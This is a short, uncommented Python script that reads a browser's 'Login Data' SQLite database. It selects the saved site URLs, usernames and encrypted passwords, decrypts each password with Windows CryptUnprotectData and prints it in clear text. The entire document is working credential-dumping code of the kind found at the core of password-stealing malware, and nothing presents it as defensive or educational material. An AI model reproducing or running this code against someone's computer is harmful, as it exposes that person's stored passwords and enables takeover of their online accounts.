import win32crypt
import sqlite3

conn = sqlite3.connect("Login Data File")
cursor = conn.cursor()
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2])[1]
    print(password)
